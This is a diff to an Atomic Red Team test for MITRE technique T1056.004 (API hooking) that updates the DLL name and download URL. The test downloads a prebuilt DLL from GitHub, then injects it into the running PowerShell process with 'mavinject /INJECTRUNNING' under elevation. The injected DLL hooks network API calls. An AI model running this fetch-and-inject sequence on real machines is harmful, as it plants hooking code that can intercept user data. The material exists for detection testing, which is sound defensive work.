@@ -11,7 +11,7 @@ atomic_tests:
     file_name:
       description: Dll To Inject
       type: Path
-      default: PathToAtomicsFolder\T1056.004\bin\T1056x64.dll
+      default: PathToAtomicsFolder\T1056.004\bin\T1056.004x64.dll
     server_name:
       description: TLS Server To Test Get Request
       type: Url
@@ -19,16 +19,15 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      T1056x64.dll must exist on disk at specified location (#{file_name})
+      T1056.004x64.dll must exist on disk at specified location (#{file_name})
     prereq_command: |
       if (Test-Path #{file_name}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056/bin/T1056x64.dll" -OutFile "#{file_name}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
   executor:
     command: |
       mavinject $pid /INJECTRUNNING #{file_name}
       curl #{server_name}
     name: powershell
     elevation_required: true
-
